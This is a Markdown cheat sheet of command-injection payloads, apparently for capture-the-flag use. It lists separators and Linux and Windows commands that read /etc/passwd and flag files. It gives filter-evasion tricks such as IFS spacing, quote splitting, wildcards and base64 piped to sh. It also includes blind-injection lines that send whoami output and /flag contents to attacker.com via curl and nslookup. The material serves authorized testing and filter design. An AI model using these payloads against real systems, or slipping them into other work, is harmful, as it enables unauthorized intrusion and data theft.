# Command Injection Techniques

## Detection
- Inject command separators: `;`, `|`, `||`, `&&`, `\n`
- Time-based: `; sleep 5` or `| sleep 5`
- Out-of-band: `; curl http://attacker.com/$(whoami)`
- Observe response changes with `; echo test123`

## Common Payloads

### Linux
- `; id`
- `| cat /etc/passwd`
- `&& whoami`
- `$(whoami)`
- `` `whoami` ``
- `\nid`
- `;cat /etc/passwd`
- `;ls -la`
- `;find / -name flag* 2>/dev/null`

### Windows
- `& dir`
- `| type C:\flag.txt`
- `&& whoami`
- `%0aid` (URL-encoded newline)

## Bypass Techniques
- Space alternatives: `${IFS}`, `$IFS`, `<`, `>`, `{cmd,arg}`
- Quote variation: `c'a't /etc/passwd`, `c"a"t /etc/passwd`
- Variable manipulation: `a=c;b=at;$a$b /etc/passwd`
- Encoding: URL encoding, double encoding, hex
- Wildcards: `/???/??t /???/p??s??`
- Line continuation: `cat\ /etc/passwd`
- Base64: `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh`

## Blind Command Injection
- Time-based: `; sleep 10 #` (observe delay)
- DNS: `; nslookup $(whoami).attacker.com`
- HTTP: `; curl http://attacker.com/?data=$(cat /flag)`
- File write: `; echo test > /tmp/probe`

## Filter Bypass
- Concatenation: `c'a't` or `c"a"t`
- Reversal: `echo "tac" | rev` (for `cat`)
- Environment variables: `${PATH:0:1}` for `/`
- Hex encoding: `$(echo 636174 | xxd -r -p)`
- Wildcards: `/???/??t` matches `/bin/cat`
